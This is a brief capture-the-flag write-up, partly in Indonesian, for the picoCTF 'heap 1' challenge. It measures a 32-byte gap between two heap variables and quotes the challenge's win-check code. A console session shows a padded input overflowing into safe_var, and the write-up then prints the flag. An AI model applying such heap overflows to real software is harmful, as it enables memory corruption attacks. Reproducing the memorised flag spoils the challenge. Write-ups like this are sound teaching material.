<h1>heap 1</h1>
<h3>Description</h3>
  <p>Can you control your overflow?
Download the binary <a href="https://artifacts.picoctf.net/c_tethys/35/chall">here</a>.
Download the source <a href="https://artifacts.picoctf.net/c_tethys/35/chall.c">here</a>.
Additional details will be available after launching your challenge instance.</p>
<h3>Solution</h3>
<pre>
  Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x55c13d41d6b0  ->   pico
+-------------+----------------+
[*]   0x55c13d41d6d0  ->   bico
+-------------+----------------+
</pre>
<p>Selisih address variabel "pico" dan "bico" = 32</p>

```
>>> 0x55c13d41d6b0-0x55c13d41d6d0
-32
```
<p>Fungsi check_win()</p>

```c
void check_win() {
    if (!strcmp(safe_var, "pico")) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
        fflush(stdout);
    }
}
```
<p>submit inputan 32 string + "pico"</p>

```console
1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaapico

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 3


Take a look at my variable: safe_var = pico


1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{starting_to_get_the_hang_b9064d7c}
```
<h3>Flag</h3>
<pre>
  picoCTF{starting_to_get_the_hang_b9064d7c}
</pre>
